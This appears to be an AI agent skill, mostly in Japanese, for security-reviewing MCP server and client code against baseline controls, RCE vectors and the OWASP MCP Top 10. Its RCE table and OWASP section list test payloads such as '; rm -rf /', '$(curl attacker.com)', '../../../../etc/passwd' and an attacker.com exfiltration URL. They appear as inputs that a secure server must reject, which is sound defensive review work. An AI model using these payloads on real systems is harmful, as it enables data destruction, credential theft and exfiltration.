---
name: mcp-implementation-security-review
description: 'MCP（Model Context Protocol）のサーバー、クライアント、ツールハンドラーの実装ソースを、認証、セッション、レート制限、入力スキーマ検証、公式SDK利用、RCEベクトル、OWASP MCP Top 10のセキュリティ基準に照らしてレビューし、ファイル・行の根拠を含む報告書を作成する。次の場合に使う。リリース前にMCPサーバー実装のセキュリティをレビューする。基準コントロール（MCP-01～MCP-05）およびOWASP MCP Top 10に照らしてサーバーを確認する。RCEベクトル（コマンド／コードインジェクション、安全でないデシリアライゼーション、パストラバーサル、SSTI、依存関係ハイジャック、SSRF）を監査する。ネットワーク公開サーバーの認証、セッション、レート制限、入力検証を確認する。信頼できないサーバー応答とセッションIDを扱うMCPクライアントコードをレビューする。「このMCPサーバーをセキュリティレビューして」「MCPサーバー実装は安全か」のような依頼。'
---

# MCP実装セキュリティレビュー

## 手順

### Step 1 — 対象を分類する
- **MCP protocol version [2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26)以降**（現行: [2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25)）か確認する。古いバージョンは指摘事項として記録し、レビューは継続する。
- 対象が**サーバー**か**クライアント**かを判定する。
- 下記のトランスポート参照を使い、トランスポートを**ネットワーク公開**または**ローカル限定**に分類する。
- トランスポート、プロトコルバージョン、セッションの有無を記録する。

**完了条件:** 対象種別、プロトコル状態、トランスポートが特定されている。

### Step 2 — 誤検知を除外する
- 指摘を作成する前に**誤検知フィルター**を適用する。
- リポジトリ自身のサーバー動作、デプロイ、トランスポート、認証態勢を説明する文書だけを対象に残す。
- フレームワーク／SDKリポジトリでは、指摘範囲を**既定構成**と**公開APIサーフェス**に限定する。

**完了条件:** 残った証拠が対象範囲内のコード、リポジトリ所有の文書、または公開APIの挙動である。

### Step 3 — 基準コントロールを確認する
- **ネットワーク公開サーバー**では**MCP-01**から**MCP-05**までを確認する。
- **ローカル／STDIOサーバー**では基準コントロールをPASS／FAILと判定せず、ベストプラクティスの注記を示してRCEレビューを続行する。
- **クライアント**ではクライアントコードから明確に確認できるトークン／セッション処理だけをレビューする。ユーザーがクライアント側リスクレビューを求めない限り、サーバー基準は適用しない。

**完了条件:** 適用可能な各コントロールに根拠のある状態が付いている。

### Step 4 — RCEベクトルを確認する
- 7つのRCEベクトルをすべてレビューする。
- 各ベクトルを**SAFE**、**AT RISK**、または**N/A**と判定する。
- 推測より直接的な証拠を優先する。下記のRCEベクトル表に確認対象のパターンを示す。

**完了条件:** 関連する各ツールにRCE結果または明示的なN/Aが付いている。

### Step 5 — OWASP MCP Top 10を確認する
- 下記のOWASPリスク10項目をすべて評価する。
- Step 3のコントロールでOWASPリスクを十分にカバーできる場合は、再確認せずその結果を参照する。
- ローカル／STDIOサーバーでは、ネットワーク依存のOWASPリスク（MCP07、MCP09）をN/Aとする。
- 各リスクをPASS、FAIL、またはNEEDS INVESTIGATIONと判定する。

**完了条件:** OWASPリスク10項目すべてに、観測可能な証拠またはStep 3の参照に基づく結果がある。

### Step 6 — 報告する
- 下記の**コンプライアンス出力形式**を使用する。
- すべての根拠にファイル／行参照を含める。
- コード上の指摘と手動フォローアップを分ける。
- 根拠が不十分な場合は**NEEDS INVESTIGATION**とし、不足している成果物を示す。

**完了条件:** 報告書にコントロール、RCE、任意のOWASP評価、対応策が含まれている。

## リファレンス

### 判定規則
- **ネットワーク公開サーバー:** **5つのコントロールすべて**を適用し、その後RCEと要求されたOWASP確認を行う。
- **ローカル／STDIOサーバー:** 5つのコントロールについて**ベストプラクティスの案内だけ**を示す。それでも、ツール入力がローカルで実行される可能性があるためRCEは確認する。
- **クライアント:** 受信トークンの処理と、サーバー提供のセッションIDを信頼しないことをレビューする。依頼されない限りサーバーコントロールを強制しない。
- **リバースプロキシまたはコンテナー公開:** ネットワーク経由でサーバーへ到達できる場合、内部バインドがlocalhostでも**ネットワーク公開**として扱う。
- **証拠が不明確:** 推測せず、**NEEDS INVESTIGATION**とし、手動で確認すべき内容を示す。
- **認証範囲があいまい:** 認証ミドルウェアが存在してもMCPエンドポイントを対象にするか不明なら、**NEEDS INVESTIGATION**とする。
- **トランスポートを判定できない:** コードからトランスポートを確定できない場合は手動レビューとして記録し、**STDIOと仮定しない**。STDIOを既定にするとサーバーコントロールを誤って省略する。

### トランスポートの分類

**ネットワーク公開（すべてのコントロールを適用）:**

| パターン | トランスポート |
|---|---|
| `transport="http"` または `transport="sse"` | HTTP/SSE |
| `StreamableHttpServerTransport` | HTTP (TS/JS) |
| `SSEServerTransport` | SSE (TS/JS) |
| `WithHttpTransport()` | HTTP (C#) |
| `host="0.0.0.0"` | 全インターフェイスへのバインド |
| MCPルートを持つExpressの `.listen(port)` | HTTP（既定値 `0.0.0.0`） |
| `EXPOSE` in Dockerfile + MCP server | ネットワーク公開 |

**ローカル限定（ベストプラクティスのみ）:**

| パターン | トランスポート |
|---|---|
| `StdioServerTransport` | STDIO (TS/JS) |
| `WithStdioServerTransport()` | STDIO (C#) |
| `transport="stdio"` | STDIO |
| 引数なしの `mcp.run()`（Python FastMCP） | STDIOの既定値 |
| URLなしで `command` キーを持つ `.vscode/mcp.json` | STDIO子プロセス |

**Host binding gotchas:**

| バインド | 実際の公開範囲 |
|---|---|
| `host="0.0.0.0"` | 🔴 ネットワーク公開 |
| `host="127.0.0.1"` または `localhost` | 🟢 ローカル限定 |
| 明示的なホスト指定なし（Express/Node） | 🔴 `0.0.0.0` が既定値 |
| 明示的なホスト指定なし（Python FastMCP） | 🟡 トランスポートに依存するため確認が必要 |
| Docker `ports: "8000:8000"` | 🔴 コンテナー内のプロセスが `127.0.0.1` にバインドしていてもネットワーク公開 |

### 誤検知フィルター

| 誤検知パターン | 検出方法 |
|---|---|
| `.github/skills/` テンプレート | パスに `.github/skills/` を含む — サーバーコードではなくSkillテンプレート |
| ベンダー提供SDK／OSSのコピー | ファイルが `class FastMCP`、`class McpServer` を定義する、またはパスが `node_modules/`、`vendor/` にある |
| MCPクライアント設定 | サーバーコードを含まず `inputs`／`servers` を持つ `.vscode/mcp.json` |
| ドキュメント／チュートリアル | リポジトリ自身のサーバーと無関係なコードフェンスを含む `.md`、`.rst` |
| 外向き通信専用の認証ライブラリ | `DefaultAzureCredential`、サービスアカウントJSONなどを外向き認証だけに使うもの |

リポジトリ**自身**のサーバー動作、トランスポート、認証態勢、デプロイを説明するドキュメントは**誤検知ではない**。

## コントロールのリファレンス

### MCP-01 — ID分離
**対象:** リモートMCPサーバー

**条件**
- 信頼できるIDプロバイダーで受信リクエストをすべて認証し、サーバー境界で認可する。セッションID、過去のリクエスト、ネットワーク位置から認証済みと推測しない。
- **サーバー固有の一意なアプリケーションID**とaudience/resource識別子を使う。外向き呼び出しでは独立したスコープのサービス資格情報または必要に応じてon-behalf-ofフローを使い、受信トークンを使わない。
- 未認証の検出エンドポイントは、メタデータのみのOAuth/MCPブートストラップに限り許可する: `/.well-known/oauth-protected-resource`、`/.well-known/oauth-authorization-server`、`/.well-known/openid-configuration`。

**確認対象**
- トークン検証と認可ミドルウェアがすべてのMCPルートで動作し、存在する場合はツール実行、読み取り専用、管理操作を区別する。
- ID設定に専用のapplication/client/resource IDとaudienceが示され、外向きクライアントは独自トークンを取得し、受信した `Authorization` をコピーしない。
- 検出エンドポイントはメタデータだけを返し、ツール実行や保護データの公開ができない。

**主な落とし穴:** 共有アプリケーションIDや転送された呼び出し元トークンはID分離を壊し、混乱した代理人経路を生む。

### MCP-02 — セッション
**Scope:** Remote MCP servers that support sessions

**Applicability**
- No session identifiers issued or used anywhere → mark **N/A** (per-request auth is still required; see MCP-01).
- Sessions managed by the transport/SDK (e.g., Streamable HTTP `Mcp-Session-Id`) but generation/binding not visible in source → mark **NEEDS INVESTIGATION**, not FAIL.
- Session identifiers present in code → score **PASS/FAIL** against the conditions below.

**Condition**
- Authenticate and authorize **every** request; session state never substitutes for token validation.
- Session IDs are opaque correlation/continuity tokens only; they do not grant privileges, encode authorization, or bypass auth.
- Session IDs are CSPRNG-generated, unpredictable, bound to an authenticated context, and never embedded in URLs.

**What to check**
- Middleware validates tokens per request, not only when a session starts.
- Authorization logic never trusts a session ID alone; loss or reuse of a session ID must not grant access.
- Session creation uses random IDs (GUID v4/CSPRNG acceptable; sequential or time-based IDs are not).

**Key pitfall:** Treating a session ID as a bearer credential turns a correlation token into authentication.

### MCP-03 — レート制限
**Scope:** MCP servers and tools

**Condition**
- Enforce rate limits and abuse protection on tool discovery and tool invocation.
- Enforce limits **at the MCP server runtime**, not only at a gateway; partition by authenticated identity and by session where sessions exist.
- Apply stricter limits to mutation-capable and high-cost tools; when limits are exceeded, fail closed with **HTTP 429** and **Retry-After** and do not execute the tool.

**What to check**
- Rate-limit middleware or equivalent is present on discovery and invocation endpoints in server code, not just in ingress or proxy config.
- Limits are keyed by identity and session, with tighter budgets for write/high-cost operations.
- Exceeded requests stop before backend action and return 429 with Retry-After.

**Starting thresholds** (tune to actual load, downstream limits, and cost):

| Tool type | Per-identity | Per-session | Notes |
|---|---|---|---|
| Read-only / listing | 100/min | 200/min | Lower if downstream APIs are sensitive |
| Mutation / write | 10/min | 20/min | Stricter for state-changing ops |
| High-cost compute | 5/min | 10/min | Cost-weighted; watch cloud spend |
| Tool discovery | 30/min | 60/min | Prevents enumeration abuse |

**Key pitfall:** Gateway-only throttling or one flat bucket leaves bypasses and under-protects expensive tools.

### MCP-04 — スキーマ検証
**Scope:** MCP servers exposing tools with structured arguments

**Condition**
- Validate **all** tool arguments against explicit schemas **before execution**.
- Schemas define types, required fields, enums, and bounds, and reject unspecified properties by default (`additionalProperties: false` or equivalent).
- Validation runs server-side on every invocation; invalid input fails closed with a 400/MCP error and no backend action.

**What to check**
- Each tool descriptor has a schema covering types, required fields, enums, bounds, and property restrictions.
- Validation occurs at the server boundary on every call, not only in clients, gateways, or downstream services.
- Negative tests reject malformed input, extra properties, and bounds violations.

**Key pitfall:** Allowing extra properties or client-only validation creates hidden attack surface and scope creep.

### MCP-05 — SDK優先
**Scope:** Remote MCP servers

**Condition**
- Build remote MCP servers on an **official MCP SDK** for your server's language:
  - **Tier 1 (fully supported):** TypeScript (modelcontextprotocol/typescript-sdk), Python (modelcontextprotocol/python-sdk), C#/.NET (modelcontextprotocol/csharp-sdk), Go (modelcontextprotocol/go-sdk)
  - **Tier 2/3 (developing):** Java (modelcontextprotocol/java-sdk), Kotlin (modelcontextprotocol/kotlin-sdk), Rust (modelcontextprotocol/rust-sdk), Swift (modelcontextprotocol/swift-sdk), PHP (modelcontextprotocol/php-sdk), Ruby (modelcontextprotocol/ruby-sdk)
- If not using an official SDK, mark MCP-05 as NEEDS INVESTIGATION.
- Keep the SDK current and patched, and verify which controls are automatic versus manual.

**What to check**
- Dependencies reference an official MCP SDK rather than a hand-rolled HTTP/SSE stack.
- If no SDK is used, the repo contains direct evidence for auth/authz, sessions, rate limits, and schema validation.
- Dependency pinning and update hygiene show the SDK is maintained.

**Key pitfall:** Hand-rolled servers often miss one "small" primitive—per-request auth, throttling, or validation—and the gaps compound.

## RCEベクトル

| Vector | Dangerous code | Safe alternative | Test payload | CWE |
|---|---|---|---|---|
| Command injection | `exec("convert " + args.filename)`, `os.system(f"process {user_input}")`, `Process.Start("cmd", "/c " + toolArg)` | `execFile("convert", [args.filename])`, `subprocess.run(["process", user_input], shell=False)` | `; rm -rf /`, `$(curl attacker.com)`, `| net user` must be rejected or treated literally | CWE-78 |
| Dynamic code evaluation | `eval(args.expression)`, `exec(tool_output)`, `new Function(args.code)()` | Sandboxed parser, AST-based evaluation, or predefined allowlist | `__import__('os').system('whoami')`, `require('child_process').exec('id')` must be rejected | CWE-94, CWE-95 |
| Unsafe deserialization | `pickle.loads(user_data)`, `yaml.load(input, Loader=yaml.UnsafeLoader)`, `BinaryFormatter.Deserialize(stream)` | `yaml.safe_load()`, `JSON.parse()` plus schema validation; avoid binary formats for untrusted input | Crafted serialized payloads must be rejected or safely handled | CWE-502 |
| Path traversal | `fs.readFile(args.path)` without validation, `open(user_path, 'w')` | Canonicalize and enforce an allowlisted base directory before read/write/execute | `../../../../etc/passwd`, `C:\Windows\System32\config\SAM`, `..\..\..\.env` must be rejected | CWE-22 |
| SSTI | `Template(user_input).render()`, `Handlebars.compile(args.template)({data})` | Never use user input as template source; use predefined templates with parameters only | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` must not render `49` | CWE-1336 |
| Dependency hijacking | Unpinned deps such as `"lodash": "^4.0.0"`; internal package names resolvable from public registries | Pin exact versions, keep lock files with integrity hashes, use trusted/scoped registries, verify signatures where available | `npm audit`, `pip audit`, or `dotnet list package --vulnerable`; review for CVEs and suspicious packages | CWE-829 |
| SSRF | `requests.get(user_param)`, `fetch(user_input)`, `HttpClient.GetAsync(user_input)` | Allowlist schemes/domains, block RFC1918 and link-local targets, validate URLs before sending | `http://169.254.169.254/latest/meta-data/`, `http://localhost:8080/admin`, `http://attacker.com/?data=stolen` must be rejected | CWE-918 |

## OWASP MCP Top 10

**MCP01:2025 — Token Mismanagement & Secret Exposure**
テスト: ハードコードされたシークレットとトークンのログ出力を検索し、シークレットが環境変数またはシークレットマネージャー由来であること、短命またはローテーションされるトークンであることを確認する。
合格: ハードコードされたシークレットがなく、機密フィールドがマスキングされ、短命またはローテーションされるトークンである。不合格: ハードコードされたシークレット、トークンのログ出力、またはローテーションのない長寿命トークン。

**MCP02:2025 — Privilege Escalation via Scope Creep**
テスト: スコープ／ロールを確認し、最小権限とリクエストごとの認可を確認する。正当な理由のないワイルドカード管理者スコープを拒否し、実行時の機能拡張を確認する。
合格: 最小権限スコープ、リクエストごとの認可、実行時の機能拡張なし。不合格: 広すぎるスコープ、一度だけの認証、自己昇格するツール。

**MCP03:2025 — Tool Poisoning**
テスト: ツール定義が静的でサーバー管理下にあるか、ツールがメタデータを変更できるか、出力にLLMが解釈可能な命令が含まれるかを確認する。
合格: 静的なサーバー管理定義とデータのみの出力。不合格: 外部メタデータソースまたは命令を埋め込んだ出力。

**MCP04:2025 — Supply Chain Attacks & Dependency Tampering**
テスト: ロックファイル、厳密なバージョン固定、不審な`postinstall`スクリプト、依存関係監査結果、信頼できるレジストリを確認する。
合格: 固定された依存関係、コミット済みロックファイル、既知の脆弱性なし、不審なpost-installスクリプトなし。不合格: 固定されていない依存関係、ロックファイルなし、未修正CVE、信頼できないレジストリ。

**MCP05:2025 — Command Injection & Execution**
テスト: シェル実行APIと文字列組み立てコマンドを検索し、ツール入力がシェル実行へ到達するか追跡する。`; ls`、`$(whoami)`、`| cat /etc/passwd`をテストする。
合格: 信頼できない入力からのシェル実行がない、またはパラメーター化された許可リスト実行だけ。不合格: ユーザー入力がシェルコマンドへ到達する、書式付き文字列で`shell=True`を使う、安全でない連結。

**MCP06:2025 — Prompt Injection via Contextual Payloads**
Test: Check whether tool output goes back to the LLM, whether external content is sanitized/truncated/sandboxed, and whether chained tool calls are guarded; test adversarial instruction-bearing output.
Pass: Tool outputs are data, untrusted content is sanitized/truncated/sandboxed, and chaining has guardrails. Fail: Raw external content returns to the model and there are no chaining limits.

**MCP07:2025 — Insufficient Authentication & Authorization**
テスト: 認証なし、期限切れ、無効なトークンでリクエストを送り、ツールごとの認可を検証する。認証がゲートウェイだけでなくサーバーで強制されることを確認する。
合格: すべてのエンドポイントが有効な認証を要求し、ツールごとの認可があり、サーバー側で強制される。不合格: 未認証アクセス、ツールごとの認可不足、ゲートウェイだけの強制。

**MCP08:2025 — Lack of Audit and Telemetry**
Test: Invoke a tool and confirm logs capture caller identity, tool name, and timestamp; trigger an error and confirm useful context; verify centralized logging and alerting.
Pass: Tool invocations are logged with identity, logs are centralized, and alerts exist. Fail: Missing logs, no caller identity, local-only logging, or no alerting.

**MCP09:2025 — Shadow MCP Servers**
Test: Verify the server exists in service inventory; inspect for undocumented MCP endpoints or exposed non-standard ports; check dev/staging isolation; verify an owner and review trail.
Pass: All servers are inventoried, isolated appropriately, and owned. Fail: Undocumented servers, dev/test exposure into production networks, or no ownership.

**MCP10:2025 — Context Injection & Over-Sharing**
Test: Inspect tool responses for data minimization; check for PII or full objects when only subsets are needed; verify context isolation.
Pass: Minimal data is returned, sensitive fields are masked/excluded, and context is isolated. Fail: Full objects are returned unnecessarily, PII is exposed, or context is shared across users.

## コンプライアンス出力形式

以下の各概要表では、**根拠**セルに状態を裏付ける具体的なファイル／行の証拠を必ず記載する。

### コントロール概要

| コントロール | 名称 | 状態 | 根拠 |
|---|---|---|---|
| MCP-01 | 認証とID分離 | ✅ PASS / ❌ FAIL / ⚠️ NEEDS INVESTIGATION / N/A | … |
| MCP-02 | セキュアなセッション管理 | … | … |
| MCP-03 | レート制限と不正利用対策 | … | … |
| MCP-04 | 入力スキーマ検証 | … | … |
| MCP-05 | 本番SDK利用 | … | … |

コードがコントロールを明確に満たす場合だけ**PASS**を使う。違反が観測できる場合は**FAIL**を使う。デプロイ構成、IDプロバイダーの状態、ログ、その他ソースに見えない証拠に依存する場合は**NEEDS INVESTIGATION**を使う。

### RCE概要

| ベクトル | 状態 | 根拠 |
|---|---|---|
| コマンドインジェクション | SAFE / AT RISK / N/A | … |
| 動的コード評価 | … | … |
| 安全でないデシリアライゼーション | … | … |
| パストラバーサル | … | … |
| SSTI | … | … |
| 依存関係ハイジャック | … | … |
| SSRF | … | … |

### OWASP概要

| リスク | 状態 | 根拠 |
|---|---|---|
| MCP01:2025 | ✅ PASS / ❌ FAIL / ⚠️ NEEDS INVESTIGATION | … |
| MCP02:2025 | … | … |
| MCP03:2025 | … | … |
| MCP04:2025 | … | … |
| MCP05:2025 | … | … |
| MCP06:2025 | … | … |
| MCP07:2025 | … | … |
| MCP08:2025 | … | … |
| MCP09:2025 | … | … |
| MCP10:2025 | … | … |

### 手動フォローアップ
ソースコードだけでは完全に解決できなかった確認をすべて列挙し、検証に必要な成果物またはアクセス権を明記する。

## 例外処理
- **Document the gap:** Identify the unmet control, the exact deviation, residual risk, and any compensating controls.
- **Get explicit approval:** Route the exception through security/release approval with an owner and an expiration or review date.
- **Track and re-evaluate:** Record the approved exception with compliance results and revisit it on expiry or whenever the server, tools, traffic profile, or exposure changes.
